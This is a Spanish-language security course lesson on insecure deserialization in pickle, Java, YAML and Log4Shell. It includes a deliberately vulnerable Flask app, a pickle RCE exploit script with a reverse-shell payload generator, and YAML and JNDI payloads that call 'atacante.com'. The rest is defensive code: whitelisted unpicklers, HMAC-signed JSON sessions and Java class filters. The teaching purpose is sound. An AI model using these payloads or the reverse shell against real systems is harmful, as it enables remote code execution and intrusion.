# Clase 24: Deserializacion Insegura

**Duracion:** 2 horas

---

## Objetivos de Aprendizaje

1. Comprender que es serializacion y deserializacion
2. Identificar los riesgos de seguridad en diferentes formatos de serializacion
3. Crear y entender payloads maliciosos en pickle (Python)
4. Implementar deserializacion segura con validacion de esquema
5. Conocer las mitigaciones contra ataques de deserializacion

---

## Contenido Detallado

### 1. Que es Serializacion/Deserializacion?

**Serializacion:** Proceso de convertir un objeto en memoria a un formato que pueda ser almacenado o transmitido (bytes, string, XML, JSON).

**Deserializacion:** Proceso inverso: reconstruir el objeto a partir del formato almacenado/transmitido.

```
Objeto en memoria ──Serializar──>  Bytes / String / JSON / XML
Bytes / String / JSON / XML  ──Deserializar──>  Objeto en memoria
```

### 2. Formatos de Serializacion

| Formato | Lenguaje | Seguro? | Notas |
|---------|----------|---------|-------|
| **pickle** | Python | NO | Ejecuta codigo arbitrario al deserializar |
| **Java serialization** | Java | NO | Puede ejecutar codigo via gadget chains |
| **PHP unserialize** | PHP | NO | Permite RCE via gadget chains |
| **YAML** | Multiples | NO | Puede ejecutar codigo con tags peligrosos |
| **JSON** | Universal | SI | Solo datos, no ejecuta codigo |
| **XML** | Universal | Parcial | Seguro si se deshabilitan DTD/entidades |
| **MessagePack** | Multiples | Generalmente seguro | No ejecuta codigo directamente |
| **Protocol Buffers** | Multiples | Seguro | Formato binario estricto |
| **CBOR** | Multiples | Generalmente seguro | Similar a JSON |

### 3. Ataques por Formato

#### pickle (Python)

pickle permite ejecutar codigo arbitrario durante la deserializacion porque esta disenado para reconstruir objetos Python, incluyendo clases y funciones arbitrarias.

```python
import pickle
import os

# Payload malicioso que ejecuta whoami
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())

# Al deserializar, se ejecuta whoami
pickle.loads(payload)  # Ejecuta: whoami
```

#### Java Serialization

Java serialization puede ser explotada mediante "gadget chains": combinaciones de clases disponibles en el classpath que, al ser deserializadas, ejecutan codigo arbitrario.

```java
// Ejemplo conceptual (simplificado)
// CommonsCollections1 es una gadget chain clasica
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("payload.ser"));
Object obj = ois.readObject();  // Ejecuta codigo si el payload usa gadgets
```

**Gadgets famosos:**
- CommonsCollections (Apache Commons Collections)
- Spring beans
- JDK built-in (URLDNS, Runtime)
- FastJSON, Jackson (polymorphic type handling)

#### YAML

YAML permite definir tipos personalizados con `!!`, que pueden ejecutar codigo.

```yaml
# Payload YAML peligroso
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [
    [!!java.net.URL ["http://atacante.com/evil.jar"]]
  ]
]
```

### 4. Log4Shell (CVE-2021-44228)

Aunque no es estrictamente deserializacion, Log4Shell es un ataque relacionado donde Log4j procesa JNDI lookups desde mensajes de log, permitiendo RCE.

```
Payload: ${jndi:ldap://atacante.com/a}
```

Log4j deserializa datos de un servidor LDAP controlado por el atacante, ejecutando codigo arbitrario.

### 5. Mitigaciones

| Mitigacion | Descripcion |
|------------|-------------|
| **No usar formatos peligrosos** | Preferir JSON sobre pickle, Java serialization, YAML |
| **Validacion de esquema** | Validar datos contra un esquema fijo antes de deserializar |
| **Firmas digitales** | Firmar datos serializados para verificar integridad y origen |
| **Librerias seguras** | Usar `json` en vez de `pickle`, `yaml.safe_load()` en vez de `yaml.load()` |
| **Lista blanca de clases** | Permitir solo clases conocidas y seguras durante la deserializacion |
| **Sandboxing** | Deserializar en entornos aislados (contenedores, sandbox) |
| **No aceptar datos serializados de fuentes no confiables** | Es la mitigacion mas simple y efectiva |

---

## Ejercicio 1: Crear y Explotar Payload Malicioso en Pickle

### Escenario

Una aplicacion Python usa pickle para serializar la sesion del usuario. Crear un payload que ejecute un comando del sistema.

**Aplicacion vulnerable:**

```python
"""
app_pickle_vulnerable.py - App que usa pickle para sesiones (vulnerable)
"""
from flask import Flask, request, jsonify, session
import pickle
import base64

app = Flask(__name__)

# SIMULACION PELIGROSA: Usar pickle para serializar datos de sesion
# Esto es intencionalmente inseguro para fines educativos

def deserialize_session(session_data_b64):
    """Deserializa datos de sesion desde base64"""
    try:
        session_data = base64.b64decode(session_data_b64)
        return pickle.loads(session_data)  # VULNERABLE: pickle.loads en datos no confiables
    except Exception as e:
        return {'error': str(e)}

@app.route('/api/datos')
def get_datos():
    # Simular recepcion de cookie serializada
    session_cookie = request.cookies.get('session_data', '')

    if not session_cookie:
        return jsonify({'error': 'No session data'}), 401

    user_data = deserialize_session(session_cookie)
    return jsonify(user_data)

@app.route('/api/login')
def login():
    # Simular login que crea sesion serializada con pickle
    user_data = {
        'username': 'usuario_ejemplo',
        'role': 'user',
        'id': 123
    }
    serialized = base64.b64encode(pickle.dumps(user_data)).decode('utf-8')

    response = jsonify({'mensaje': 'Login exitoso', 'session': serialized})
    response.set_cookie('session_data', serialized, httponly=True)
    return response

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

**Script de explotacion:**

```python
"""
exploit_pickle.py - Genera payload malicioso para pickle
"""
import pickle
import base64
import os
import subprocess

# ============================================================
# CLASE EXPLOIT
# ============================================================

class RCE:
    """Clase que ejecuta un comando al ser deserializada"""
    def __reduce__(self):
        """
        __reduce__ es un metodo especial que pickle usa para
        determinar como reconstruir un objeto.
        Retorna: (callable, args)
        - callable: la funcion a ejecutar
        - args: tupla de argumentos para la funcion
        """
        return (os.system, ('whoami',))

    def __str__(self):
        return "Payload malicioso de pickle"


# ============================================================
# GENERAR PAYLOAD
# ============================================================

def generate_pickle_payload(command='whoami'):
    """Genera un payload pickle que ejecuta un comando"""
    class DynamicRCE:
        def __reduce__(self):
            return (os.system, (command,))

    payload_bytes = pickle.dumps(DynamicRCE())
    payload_b64 = base64.b64encode(payload_bytes).decode('utf-8')
    return payload_b64


def generate_reverse_shell_payload(ip, port):
    """Genera payload para reverse shell (simulado/educativo)"""
    command = f'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"'
    return generate_pickle_payload(command)


# ============================================================
# EXPLOTACION
# ============================================================

def exploit_vulnerable_app():
    """Demostracion de explotacion contra app vulnerable"""
    import requests

    base_url = "http://127.0.0.1:5000"

    # 1. Primero, login normal para ver el formato
    print("[*] Obteniendo sesion normal...")
    r = requests.get(f"{base_url}/api/login")
    normal_session = r.cookies.get('session_data', '')
    if normal_session:
        print(f"[+] Sesion normal obtenida: {normal_session[:50]}...")

    # 2. Generar payload malicioso
    print("\n[*] Generando payload malicioso...")
    payload = generate_pickle_payload('whoami')
    print(f"[+] Payload: {payload}")

    # 3. Enviar payload como cookie
    print("\n[*] Enviando payload malicioso al servidor...")
    r = requests.get(
        f"{base_url}/api/datos",
        cookies={'session_data': payload}
    )
    print(f"[+] Respuesta del servidor: {r.text}")

    # 4. Payload para comando personalizado
    print("\n[*] Probando payload para listar directorio...")
    ls_payload = generate_pickle_payload('dir' if os.name == 'nt' else 'ls -la')
    r = requests.get(
        f"{base_url}/api/datos",
        cookies={'session_data': ls_payload}
    )
    print(f"[+] Respuesta del servidor: {r.text}")


# ============================================================
# DEMOSTRACION LOCAL
# ============================================================

def demo_pickle_local():
    """Demostracion local de como pickle ejecuta codigo"""
    print("=" * 60)
    print("DEMOSTRACION: pickle ejecuta codigo al deserializar")
    print("=" * 60)

    # Crear payload malicioso
    payload_bytes = pickle.dumps(RCE())
    print(f"\n[+] Payload serializado: {payload_bytes.hex()[:60]}...")

    print("\n[!] Deserializando payload... (se ejecutara 'whoami')")
    print("[!] ESTO ES PELIGROSO - No hacer en produccion")
    print("-" * 40)

    try:
        # AL DESERIALIZAR, SE EJECUTA EL COMANDO
        obj = pickle.loads(payload_bytes)
        print(f"\n[+] Objeto deserializado: {obj}")
    except Exception as e:
        print(f"\n[-] Error: {e}")


def demo_safe_deserialization():
    """Demostracion de como deserializar pickle de forma segura"""
    print("\n" + "=" * 60)
    print("DESERIALIZACION SEGURA (limitada)")
    print("=" * 60)

    # Restringir que clases pueden ser deserializadas
    import builtins

    class SafeUnpickler(pickle.Unpickler):
        """Unpickler que solo permite clases seguras"""

        ALLOWED_CLASSES = {
            'builtins.dict': dict,
            'builtins.list': list,
            'builtins.str': str,
            'builtins.int': int,
            'builtins.float': float,
            'builtins.bool': bool,
            'builtins.tuple': tuple,
            'builtins.set': set,
            'builtins.NoneType': type(None),
        }

        def find_class(self, module, name):
            """Sobreescribe find_class para restringir clases permitidas"""
            full_name = f"{module}.{name}"
            if full_name not in self.ALLOWED_CLASSES:
                raise pickle.UnpicklingError(
                    f"Clase no permitida: {full_name}"
                )
            return self.ALLOWED_CLASSES[full_name]

    # Intentar deserializar payload malicioso
    payload = pickle.dumps(RCE())

    try:
        # Esto fallara porque RCE no esta en la lista blanca
        safe_unpickler = SafeUnpickler(io.BytesIO(payload))
        obj = safe_unpickler.load()
        print(f"[-] Deserializacion exitosa (inesperado): {obj}")
    except pickle.UnpicklingError as e:
        print(f"[+] Clase maliciosa bloqueada: {e}")
    except Exception as e:
        print(f"[+] Payload malicioso detectado: {e}")


if __name__ == '__main__':
    import io

    print("\n=== EJERCICIO: Pickle RCE ===\n")

    # Demo local
    demo_pickle_local()
    print()

    # Demostracion de lista blanca
    demo_safe_deserialization()

    print("\n=== EXPLOTACION CONTRA SERVIDOR ===")
    print("Para explotar el servidor, ejecutar:")
    print("1. Iniciar servidor: python app_pickle_vulnerable.py")
    print("2. Ejecutar exploit: python -c 'from exploit_pickle import *; exploit_vulnerable_app()'")
```

---

## Ejercicio 2: Deserializacion Segura en Python con JSON y Validacion de Esquema

### Escenario

Reemplazar pickle con JSON y agregar validacion de esquema usando una libreria como `jsonschema` o validacion manual.

```python
"""
safe_deserialization.py - Deserializacion segura con JSON y esquema
"""
from flask import Flask, request, jsonify
import json
import hmac
import hashlib
import os
from typing import Any, Dict, Optional

app = Flask(__name__)

# ============================================================
# CONFIGURACION
# ============================================================

# Clave secreta para firmar tokens (NUNCA hardcodear en produccion)
SECRET_KEY = os.urandom(32).hex()
app.config['SECRET_KEY'] = SECRET_KEY

# Esquema de datos de sesion permitido
SESSION_SCHEMA = {
    'username': str,
    'user_id': int,
    'role': str,
    'email': str,
    'created_at': str,
}

ROLES_PERMITIDOS = {'admin', 'user', 'viewer'}


# ============================================================
# VALIDACION DE ESQUEMA
# ============================================================

def validate_session_data(data: Dict[str, Any]) -> bool:
    """
    Valida que los datos cumplan con el esquema esperado.
    Retorna True si son validos, False en caso contrario.
    """
    if not isinstance(data, dict):
        return False

    # Verificar que todos los campos requeridos esten presentes
    for field, field_type in SESSION_SCHEMA.items():
        if field not in data:
            print(f"Campo faltante: {field}")
            return False
        if not isinstance(data[field], field_type):
            print(f"Tipo incorrecto para {field}: esperado {field_type}, obtenido {type(data[field])}")
            return False

    # Validar valores especificos
    if data['role'] not in ROLES_PERMITIDOS:
        print(f"Rol no permitido: {data['role']}")
        return False

    if data['user_id'] <= 0:
        print(f"User ID invalido: {data['user_id']}")
        return False

    if not isinstance(data['username'], str) or len(data['username']) < 1:
        print("Username invalido")
        return False

    return True


def validate_extra_data(data: Dict[str, Any]) -> bool:
    """
    Verifica que no haya campos adicionales no esperados.
    Esto previene que el atacante inyecte datos arbitrarios.
    """
    allowed_fields = set(SESSION_SCHEMA.keys())
    actual_fields = set(data.keys())

    extra_fields = actual_fields - allowed_fields
    if extra_fields:
        print(f"Campos no permitidos: {extra_fields}")
        return False

    return True


# ============================================================
# FIRMAS DIGITALES
# ============================================================

def sign_data(data: Dict[str, Any]) -> str:
    """Firma los datos con HMAC-SHA256 para detectar manipulacion"""
    serialized = json.dumps(data, sort_keys=True, separators=(',', ':'))
    signature = hmac.new(
        SECRET_KEY.encode('utf-8'),
        serialized.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    return signature


def verify_signature(data: Dict[str, Any], signature: str) -> bool:
    """Verifica la firma de los datos"""
    expected = sign_data(data)
    # Usar compare_digest para prevenir timing attacks
    return hmac.compare_digest(expected, signature)


# ============================================================
# API SEGURA
# ============================================================

@app.route('/api/session/create', methods=['POST'])
def create_session():
    """Crea una sesion segura firmada"""
    data = request.get_json()

    if not data:
        return jsonify({'error': 'Datos invalidos'}), 400

    # Validar esquema
    if not validate_session_data(data):
        return jsonify({'error': 'Datos de sesion invalidos'}), 400

    if not validate_extra_data(data):
        return jsonify({'error': 'Campos adicionales no permitidos'}), 400

    try:
        # Serializar a JSON
        serialized = json.dumps(data, separators=(',', ':'))

        # Firmar los datos
        signature = sign_data(data)

        # Devolver token seguro
        return jsonify({
            'token': serialized,
            'signature': signature,
            'format': 'json_signed',
            'mensaje': 'Sesion creada de forma segura'
        })

    except Exception as e:
        return jsonify({'error': f'Error creando sesion: {str(e)}'}), 500


@app.route('/api/session/verify', methods=['POST'])
def verify_session():
    """Verifica y deserializa una sesion segura"""
    data = request.get_json()
    token = data.get('token', '') if data else ''
    signature = data.get('signature', '') if data else ''

    if not token or not signature:
        return jsonify({'error': 'Token y signature requeridos'}), 400

    try:
        # 1. Deserializar JSON
        session_data = json.loads(token)

        # 2. Verificar que es un diccionario
        if not isinstance(session_data, dict):
            return jsonify({'error': 'Formato de token invalido'}), 400

        # 3. Verificar firma
        if not verify_signature(session_data, signature):
            return jsonify({'error': 'Firma invalida - token manipulado'}), 403

        # 4. Validar esquema
        if not validate_session_data(session_data):
            return jsonify({'error': 'Datos de sesion invalidos'}), 400

        # 5. Validar campos extra
        if not validate_extra_data(session_data):
            return jsonify({'error': 'Campos adicionales no permitidos'}), 400

        return jsonify({
            'valid': True,
            'session': {
                'username': session_data['username'],
                'user_id': session_data['user_id'],
                'role': session_data['role'],
            },
            'mensaje': 'Sesion verificada correctamente'
        })

    except json.JSONDecodeError:
        return jsonify({'error': 'JSON invalido'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/session/info')
def session_info():
    """Endpoint informativo"""
    return jsonify({
        'formato': 'JSON con validacion de esquema y firma HMAC-SHA256',
        'campos_permitidos': list(SESSION_SCHEMA.keys()),
        'roles_permitidos': list(ROLES_PERMITIDOS),
        'mitigaciones': [
            'Formato JSON (no ejecuta codigo)',
            'Validacion de esquema estricta (tipos y valores)',
            'Firma HMAC-SHA256 contra manipulacion',
            'Rechazo de campos adicionales',
            'Validacion de roles permitidos',
        ]
    })


# ============================================================
# PRUEBAS
# ============================================================

def run_tests():
    """Pruebas automatizadas"""
    import requests

    base = "http://127.0.0.1:5000"

    def test(name, endpoint, data, expected_status):
        r = requests.post(f"{base}{endpoint}", json=data)
        status = "PASS" if r.status_code == expected_status else "FAIL"
        print(f"[{status}] {name} (status: {r.status_code}, esperado: {expected_status})")
        if status == "FAIL":
            print(f"  Respuesta: {r.text[:100]}")
        return r

    # Test 1: Crear sesion valida
    test("Crear sesion valida", "/api/session/create", {
        'username': 'juanperez',
        'user_id': 123,
        'role': 'user',
        'email': 'juan@example.com',
        'created_at': '2024-01-15T10:30:00',
    }, 200)

    # Test 2: Sesion con rol invalido
    test("Rol invalido", "/api/session/create", {
        'username': 'admin',
        'user_id': 1,
        'role': 'superadmin',
        'email': 'admin@test.com',
        'created_at': '2024-01-15',
    }, 400)

    # Test 3: Sesion con campo adicional
    test("Campo adicional", "/api/session/create", {
        'username': 'test',
        'user_id': 1,
        'role': 'user',
        'email': 'test@test.com',
        'created_at': '2024-01-15',
        'is_admin': True,  # Campo no permitido
    }, 400)

    # Test 4: Tipo incorrecto
    test("Tipo incorrecto en user_id", "/api/session/create", {
        'username': 'test',
        'user_id': 'abc',  # Deberia ser int
        'role': 'user',
        'email': 'test@test.com',
        'created_at': '2024-01-15',
    }, 400)

    # Test 5: Verificar sesion con firma correcta
    r = test("Crear sesion para verificar", "/api/session/create", {
        'username': 'testuser',
        'user_id': 456,
        'role': 'viewer',
        'email': 'viewer@example.com',
        'created_at': '2024-06-01',
    }, 200)

    if r.status_code == 200:
        data = r.json()
        test("Verificar sesion con firma valida", "/api/session/verify", {
            'token': data['token'],
            'signature': data['signature'],
        }, 200)

        # Test 6: Verificar con firma invalida
        test("Verificar sesion con firma invalida", "/api/session/verify", {
            'token': data['token'],
            'signature': 'firma_invalida',
        }, 403)


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

---

## Ejercicio 3: Deserializacion Segura en Java con Validacion

### Escenario

Dado codigo Java que usa ObjectInputStream para deserializar datos de usuario, escribir una version segura con validacion.

**Codigo vulnerable original:**

```java
// VulnerableServlet.java
import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;
import javax.json.*;

public class VulnerableServlet extends HttpServlet {

    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {

        // Leer datos serializados del request
        byte[] data = req.getInputStream().readAllBytes();

        // VULNERABLE: Deserializa directamente sin validacion
        try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
             ObjectInputStream ois = new ObjectInputStream(bis)) {

            Object obj = ois.readObject();  // Puede ejecutar codigo arbitrario
            resp.getWriter().println("Objeto deserializado: " + obj);

        } catch (ClassNotFoundException e) {
            resp.getWriter().println("Error: Clase no encontrada");
        }
    }
}
```

**Version corregida con validacion:**

```java
// SafeDeserializationServlet.java
import java.io.*;
import java.security.*;
import java.util.*;
import javax.servlet.*;
import javax.servlet.http.*;
import com.google.gson.*;

public class SafeDeserializationServlet extends HttpServlet {

    // Lista blanca de clases permitidas para deserializar
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.lang.Boolean",
        "java.lang.Double",
        "java.util.ArrayList",
        "java.util.HashMap",
        "java.util.HashSet",
        "com.miapp.model.Usuario",
        "com.miapp.model.Sesion"
    );

    // Clave secreta para verificar firmas
    private static final String HMAC_KEY = System.getenv("SERIALIZATION_KEY");
    static {
        if (HMAC_KEY == null || HMAC_KEY.isEmpty()) {
            throw new RuntimeException("SERIALIZATION_KEY no configurada");
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {

        resp.setContentType("application/json");
        PrintWriter out = resp.getWriter();

        try {
            // Opcion 1: Usar JSON en lugar de serializacion nativa
            String jsonBody = new String(req.getInputStream().readAllBytes(), "UTF-8");
            Gson gson = new Gson();

            // Validar estructura basica
            JsonObject json = JsonParser.parseString(jsonBody).getAsJsonObject();

            // Validar campos requeridos
            if (!json.has("type") || !json.has("data") || !json.has("signature")) {
                out.println("{\"error\": \"Campos requeridos faltantes\"}");
                resp.setStatus(400);
                return;
            }

            String type = json.get("type").getAsString();
            String data = json.get("data").toString();
            String signature = json.get("signature").getAsString();

            // Verificar firma
            if (!verifyHMAC(data, signature)) {
                out.println("{\"error\": \"Firma invalida\"}");
                resp.setStatus(403);
                return;
            }

            // Deserializar segun tipo
            Object result;
            switch (type) {
                case "usuario":
                    Usuario user = gson.fromJson(data, Usuario.class);
                    result = user;
                    break;
                case "sesion":
                    Sesion sesion = gson.fromJson(data, Sesion.class);
                    result = sesion;
                    break;
                default:
                    out.println("{\"error\": \"Tipo no soportado\"}");
                    resp.setStatus(400);
                    return;
            }

            out.println("{\"success\": true, \"data\": " + gson.toJson(result) + "}");

        } catch (Exception e) {
            out.println("{\"error\": \"Error deserializando datos\"}");
            resp.setStatus(500);
        }
    }

    /**
     * Metodo seguro con ObjectInputStream + LookAheadObjectInputStream
     * para cuando se debe usar serializacion nativa de Java
     */
    public static Object safeDeserialize(byte[] data) throws Exception {
        try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
             LookAheadObjectInputStream laois = new LookAheadObjectInputStream(bis)) {

            Object obj = laois.readObject();
            return obj;
        }
    }

    /**
     * LookAheadObjectInputStream implementa lista blanca de clases
     * para prevenir ataques de deserializacion con gadget chains
     */
    static class LookAheadObjectInputStream extends ObjectInputStream {

        public LookAheadObjectInputStream(InputStream in) throws IOException {
            super(in);
            // Activar filtro de clases si disponible (Java 9+)
            if (ObjectInputFilter.Config.getSerialFilter() == null) {
                ObjectInputFilter filter = info -> {
                    Class<?> clazz = info.serialClass();
                    if (clazz != null) {
                        if (ALLOWED_CLASSES.contains(clazz.getName())) {
                            return ObjectInputFilter.Status.ALLOWED;
                        }
                        return ObjectInputFilter.Status.REJECTED;
                    }
                    return ObjectInputFilter.Status.UNDECIDED;
                };
                this.setObjectInputFilter(filter);
            }
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc)
                throws IOException, ClassNotFoundException {

            String className = desc.getName();

            // Verificar lista blanca antes de cargar la clase
            if (!ALLOWED_CLASSES.contains(className)) {
                throw new InvalidClassException(
                    "Clase no permitida para deserializacion", className);
            }

            return super.resolveClass(desc);
        }

        @Override
        protected Object resolveObject(Object obj) throws IOException {
            // Validar el objeto despues de deserializar
            if (obj != null) {
                validateObject(obj);
            }
            return super.resolveObject(obj);
        }

        private void validateObject(Object obj) {
            // Validaciones especificas por tipo
            if (obj instanceof Usuario) {
                Usuario user = (Usuario) obj;
                if (user.getId() <= 0) {
                    throw new SecurityException("ID de usuario invalido");
                }
                if (user.getRole() == null) {
                    throw new SecurityException("Rol de usuario requerido");
                }
            }
        }
    }

    private boolean verifyHMAC(String data, String signature) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            SecretKeySpec keySpec = new SecretKeySpec(
                HMAC_KEY.getBytes("UTF-8"), "HmacSHA256");
            mac.init(keySpec);
            byte[] expected = mac.doFinal(data.getBytes("UTF-8"));
            String expectedHex = bytesToHex(expected);
            return MessageDigest.isEqual(
                expectedHex.getBytes(), signature.getBytes());
        } catch (Exception e) {
            return false;
        }
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    // Clases de ejemplo
    static class Usuario implements Serializable {
        private int id;
        private String username;
        private String role;

        public int getId() { return id; }
        public String getRole() { return role; }
    }

    static class Sesion implements Serializable {
        private String sessionId;
        private long expiresAt;
        private int userId;
    }
}
```

**Principios de seguridad aplicados:**

1. **Usar JSON en vez de serializacion nativa de Java** cuando sea posible
2. **Lista blanca de clases** en `resolveClass()` - solo clases conocidas
3. **Validacion posterior** de los objetos deserializados
4. **Firma HMAC** para verificar integridad y autenticidad
5. **ObjectInputFilter** (Java 9+) para filtrado adicional

---

## Preguntas y Respuestas

### Pregunta 1
**Por que pickle es peligroso y cuando deberia usarse?**

**Respuesta:** pickle es peligroso porque ejecuta codigo arbitrario durante la deserializacion. El metodo `__reduce__` permite especificar cualquier funcion y argumentos, por lo que `pickle.loads()` puede ejecutar `os.system()`, `subprocess.call()`, o cualquier otra funcion. Pickle solo deberia usarse cuando: (1) los datos provienen de una fuente completamente confiable (el mismo proceso), (2) los datos nunca son expuestos al exterior, (3) no hay posibilidad de que un atacante modifique los datos serializados. En cualquier otro caso, usar JSON, MessagePack, o Protocol Buffers.

### Pregunta 2
**Que son las gadget chains en Java deserialization?**

**Respuesta:** Las gadget chains son secuencias de clases disponibles en el classpath que, cuando se deserializan en orden, permiten ejecutar codigo arbitrario. Cada "gadget" es una clase que realiza una accion potencialmente peligrosa durante su deserializacion (como invocar un metodo, escribir un archivo, o establecer una propiedad). Al encadenar varios gadgets, el atacante puede lograr RCE. Ejemplos famosos: CommonsCollections1 (Apache Commons Collections), Spring PropertyPathFactoryBean, JDK7u21. La mitigacion principal es mantener las librerias actualizadas y usar listas blancas de clases.

### Pregunta 3
**Cual es la relacion entre Log4Shell y deserializacion insegura?**

**Respuesta:** Log4Shell (CVE-2021-44228) explota la funcionalidad de JNDI lookups en Log4j. Aunque no es deserializacion clasica, el atacante envia un payload como `${jndi:ldap://atacante.com/exploit}` que Log4j procesa. Log4j realiza una consulta LDAP a un servidor controlado por el atacante, que responde con una referencia a una clase Java. El cliente Log4j descarga y ejecuta esa clase, efectivamente ejecutando codigo arbitrario. Es una forma de deserializacion remota: datos no confiables (el payload en el log) desencadenan la carga y ejecucion de codigo desde una fuente externa.

### Pregunta 4
**Como se valida un esquema de deserializacion segura?**

**Respuesta:** La validacion de esquema debe incluir: (1) **verificacion de tipo**: cada campo debe ser del tipo esperado (str, int, float, bool, list, dict), no aceptar tipos arbitrarios, (2) **verificacion de estructura**: los campos requeridos deben estar presentes y los campos adicionales deben ser rechazados, (3) **verificacion de valores**: rangos permitidos, valores permitidos (enum), longitudes maximas, (4) **verificacion de consistencia**: relaciones entre campos (ej: fecha_inicio < fecha_fin), (5) **firma digital**: HMAC o firma asimetrica para verificar que los datos no fueron manipulados. En Python, usar `jsonschema` o validacion manual. En Java, usar Bean Validation (JSR 380) con anotaciones.

### Pregunta 5
**Es seguro usar yaml.load() en Python? Cual es la alternativa?**

**Respuesta:** `yaml.load()` es INSEGURO porque puede ejecutar codigo arbitrario usando objetos Python personalizados. YAML permite definir tipos arbitrarios con tags `!!python/object:`, `!!python/name:`, `!!eval:`, etc. La alternativa segura es `yaml.safe_load()`, que solo acepta tipos YAML estandar (dict, list, str, int, float, bool, None). Si necesitas YAML completo (con tipos personalizados), debes implementar una lista blanca de constructores permitidos usando `yaml.add_constructor()`, similar a la lista blanca de clases en Java.

### Pregunta 6
**Cuales son las mitigaciones recomendadas por OWASP contra deserializacion insegura?**

**Respuesta:** OWASP recomienda: (1) **no aceptar datos serializados de fuentes no confiables** (la mitigacion mas efectiva), (2) **usar formatos de datos seguros** como JSON en lugar de pickle, Java serialization, o YAML, (3) **implementar listas blancas de clases** durante la deserializacion, (4) **firmar digitalmente** los datos serializados para verificar integridad, (5) **validar el esquema** de los datos despues de deserializar, (6) **deserializar en un entorno aislado** (sandbox, contenedor con minimos privilegios), (7) **monitorear y loggear** intentos de deserializacion sospechosos, (8) **mantener librerias actualizadas** para evitar gadget chains conocidas.

---

## Tarea / Lectura Recomendada

1. **Leer:** OWASP Deserialization Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
2. **Leer:** OWASP Java Deserialization - https://owasp.org/www-project-cheat-sheets/cheatsheets/Deserialization_Cheat_Sheet.html
3. **Practicar:** PortSwigger Deserialization Labs - https://portswigger.net/web-security/deserialization
4. **Experimentar:** Generar payloads pickle con diferentes comandos y probar contra la app vulnerable
5. **Leer:** ysoserial - Herramienta para generar payloads de deserializacion Java: https://github.com/frohoff/ysoserial
6. **Profundizar:** Investigar el ataque Log4Shell en detalle y sus mitigaciones
7. **Leer:** Python pickle documentation - warnings about security: https://docs.python.org/3/library/pickle.html


